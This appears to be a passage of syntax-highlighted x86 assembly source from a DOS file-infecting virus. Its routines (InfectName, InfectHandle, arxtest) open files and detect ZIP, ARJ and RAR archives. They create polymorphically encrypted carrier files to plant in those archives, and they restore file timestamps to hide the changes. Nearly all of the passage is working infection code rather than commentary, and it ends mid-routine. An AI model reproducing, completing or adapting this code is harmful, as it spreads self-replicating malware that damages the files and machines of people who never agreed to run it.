</span><span class="sc1">; 2. no -AV in ZIP</span><span class="sc0">
</span><span class="sc1">; 3. no support RAR 1.30</span><span class="sc0">
</span><span class="sc1">; 4. no support long names</span><span class="sc0">

</span><span class="sc9">INCLUDE</span><span class="sc0"> </span><span class="sc5">ZURICH.ASI</span><span class="sc0">

</span><span class="sc5">code</span><span class="sc0"> </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">public</span><span class="sc0">
</span><span class="sc9">assume</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc0">
</span><span class="sc5">STACKBASE</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">080h</span><span class="sc0">

</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">DOSCALL</span><span class="sc0">             </span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">DOStruncate</span><span class="sc0">         </span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">rt_err</span><span class="sc0">              </span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">vir_heap</span><span class="sc0">            </span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">EXE_TEST</span><span class="sc0">            </span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">SEEK_END</span><span class="sc0">            </span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">TEST_SIZE</span><span class="sc0">           </span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">START_DATA</span><span class="sc0">          </span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">CALC_HDR_PAGES</span><span class="sc0">      </span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">DOSSEEK</span><span class="sc0">             </span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">START_DATA</span><span class="sc0">          </span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">DOSSEEK_BOF</span><span class="sc0">         </span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">ZME_crypt</span><span class="sc0">           </span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">dosseek_cur</span><span class="sc0">         </span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">DosCall_exc</span><span class="sc0">         </span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">SHIT_AX</span><span class="sc0">             </span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">get_sft</span><span class="sc0">             </span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">dostell</span><span class="sc0">             </span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">heap</span><span class="sc0">                </span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">DosSeek_all</span><span class="sc0">         </span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">dosseek_cur_neg_dx</span><span class="sc0">  </span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">dosseek_cur_neg_ax</span><span class="sc0">  </span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">dosseek_cur_cx_1</span><span class="sc0">    </span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">dosseek_cur_cx_0</span><span class="sc0">    </span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">dosseek_cx_0</span><span class="sc0">        </span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">arj_h</span><span class="sc0">               </span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">zip_h</span><span class="sc0">               </span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">dosread</span><span class="sc0">             </span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">read_buf_22</span><span class="sc0">         </span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">read_buf_cx</span><span class="sc0">         </span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">DosWrite_shbuf_22</span><span class="sc0">   </span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">DosWrite_shbuf</span><span class="sc0">      </span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">DosWrite</span><span class="sc0">            </span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">dosclose</span><span class="sc0">            </span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">doswrite_from_heap</span><span class="sc0">  </span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">_____</span><span class="sc0">               </span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">Calculate_CRC</span><span class="sc0">       </span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">get_cur_time</span><span class="sc0">        </span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">get_crc_just_fname</span><span class="sc0">  </span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">InfectTurn</span><span class="sc0">          </span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">crypt_exe_header</span><span class="sc0">    </span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">InfectName</span><span class="sc0">
    </span><span class="sc5">MOVSEG</span><span class="sc0">  </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">InfectTurn</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_crc_just_fname</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">$ret</span><span class="sc10">$</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">turn_name_crc</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">$ret</span><span class="sc10">$</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">turn_name_crc</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3D12h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DosCall_exc</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">InfectHandle</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">dosclose</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">InfectHandle</span><span class="sc0"> </span><span class="sc1">;ret</span><span class="sc0">
</span><span class="sc1">;    cld</span><span class="sc0">
    </span><span class="sc5">MOVSEG</span><span class="sc0">  </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
    </span><span class="sc5">MOVSEG</span><span class="sc0">  </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">no_freq_proc</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5700h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">doscall</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">host_arx_date</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc1">;  dx = date</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">host_arx_time</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc1">;  cx = time</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Ah</span><span class="sc0">  </span><span class="sc1">; ¯®«ãç¨âì â¥ªãéãî ¤ âã ¨ ......</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">doscall</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">host_arx_date</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;­¥ § à ¦ âì ä ©«ë íâ®© ­¥¤¥«¨</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">18h</span><span class="sc0"> </span><span class="sc1">;week only         ; ¨áª«. á®§¤ ¢ ¥¬ë¥ ä ©«ë (?)</span><span class="sc0">
    </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">NZ</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">arxtest</span><span class="sc0">
    </span><span class="sc5">DONE</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">host_arx_time</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">   </span><span class="sc1">;change time for 1F</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">host_arx_date</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5701h</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">doscall_exc</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">arxtest</span><span class="sc0"> </span><span class="sc1">;close file(?)</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RND_INIT</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4400h</span><span class="sc0">        </span><span class="sc1">; IOCTL test for file/stream</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DosCall_exc</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
    </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">NC</span><span class="sc0">
</span><span class="sc5">$ret</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">;don't restore file time</span><span class="sc0">
</span><span class="sc5">$ret</span><span class="sc10">$</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">retn</span><span class="sc0">
    </span><span class="sc5">DONE</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Fh</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">  </span><span class="sc1">;1=a, 3=C</span><span class="sc0">

</span><span class="sc1">;IFDEF RELIZ</span><span class="sc0">
</span><span class="sc1">;   cmp     dl, 3</span><span class="sc0">
</span><span class="sc1">;ELSE</span><span class="sc0">
</span><span class="sc1">;   cmp     dl, 4</span><span class="sc0">
</span><span class="sc1">;    jbe      $ret ; no flop &amp; C:</span><span class="sc0">
</span><span class="sc1">;ENDIF</span><span class="sc0">
</span><span class="sc1">;    jc      $ret ; no flop</span><span class="sc0">
</span><span class="sc1">;int 2bh</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc1">;&lt;&lt;debug</span><span class="sc0">
</span><span class="sc6">jbe</span><span class="sc0">  </span><span class="sc5">$ret</span><span class="sc0">      </span><span class="sc1">;&lt;&lt;debug</span><span class="sc0">
</span><span class="sc5">$BEEP</span><span class="sc10">$</span><span class="sc0">
</span><span class="sc1">;cmp     dl, 2 ;&lt;&lt;debug</span><span class="sc0">
</span><span class="sc1">;je  $ret      ;&lt;&lt;debug</span><span class="sc0">
</span><span class="sc1">;cmp     dl, 1 ;&lt;&lt;debug</span><span class="sc0">
</span><span class="sc1">;je  $ret      ;&lt;&lt;debug</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_sft</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">di.sf_name.9</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'V'</span><span class="sc0"> </span><span class="sc1">;*.ov?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">$ret</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">NZ</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
            </span><span class="sc5">sto_word</span><span class="sc0">  </span><span class="sc2">2012h</span><span class="sc0">
            </span><span class="sc5">sto_byte</span><span class="sc0">  </span><span class="sc2">20h</span><span class="sc0">
        </span><span class="sc5">DONE</span><span class="sc0">

        </span><span class="sc5">movseg</span><span class="sc0">  </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">32h</span><span class="sc0">           </span><span class="sc1">;get DPB</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DosCall</span><span class="sc0">                </span><span class="sc1">;test for RAM-DISK</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">dpb_FAT_count</span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">  </span><span class="sc1">;RAM-DISK have one FAT</span><span class="sc0">
    </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc9">NE</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">36h</span><span class="sc0">           </span><span class="sc1">;get Disk space</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DosCall</span><span class="sc0">          </span><span class="sc1">;BX - free clusters</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">      </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc0">           </span><span class="sc1">;BX &lt; 100h</span><span class="sc0">
    </span><span class="sc5">DONE</span><span class="sc0">
</span><span class="sc1">;no_free_space2:                  ;8k*100h  = 2Mb</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">            </span><span class="sc1">;.5k*100h = 128k</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">$ret</span><span class="sc0">

</span><span class="sc1">;int 2bh</span><span class="sc0">
</span><span class="sc1">;    mov     es:[(di-1).sf_mode.l], 12h   ;mode +2</span><span class="sc0">
</span><span class="sc1">;    mov     es:[(di-1).sf_attr], 20h     ;attr +4</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">dosseek_bof</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">second_tst</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">read_buf_22</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">HDRBUFSIZE</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">__ret</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">crcpass</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
    </span><span class="sc5">DO</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc5">crcpass</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">E</span><span class="sc0"> </span><span class="sc1">;CPU conveir</span><span class="sc0">
</span><span class="sc5">__ret</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">ret</span><span class="sc0">
        </span><span class="sc5">DONE</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">vir_heap._exehdr</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;4,2,1</span><span class="sc0">
</span><span class="sc5">crcpass</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">calculate_crc</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">hdrs</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">offs</span><span class="sc4">-</span><span class="sc5">hdrs</span><span class="sc4">)/</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">repne</span><span class="sc0">   </span><span class="sc6">scasw</span><span class="sc0">
    </span><span class="sc5">CYCLE</span><span class="sc0"> </span><span class="sc5">NZ</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc5">offs</span><span class="sc4">-</span><span class="sc5">hdrs</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">offs</span><span class="sc4">-</span><span class="sc5">endarxex</span><span class="sc4">)/</span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;&lt;&lt;&lt;</span><span class="sc0">
    </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">AE</span><span class="sc0">  </span><span class="sc1">;zip, arj, rar</span><span class="sc0">
</span><span class="sc1">;Ä[create &amp; infect file]ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RND_GET_BYTE</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">heap</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc5">sto_byte</span><span class="sc0"> </span><span class="sc5">opJMPN</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">zmeflARX</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ZME_crypt</span><span class="sc0"> </span><span class="sc1">;;ret CX-SIZE</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">heap</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fioff</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">  </span><span class="sc1">;&lt;com</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RND_GET</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFh</span><span class="sc0"> </span><span class="sc1">;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;,</span><span class="sc0">
</span><span class="sc1">;        push    ax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">    </span><span class="sc1">;&lt;com</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fisize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc1">;&lt;all</span><span class="sc0">
</span><span class="sc1">;        pop     ax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SHIT_AX</span><span class="sc0">
</span><span class="sc1">;create &amp; infect carrier</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fisize</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Calculate_CRC</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">arx_crc.lo</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
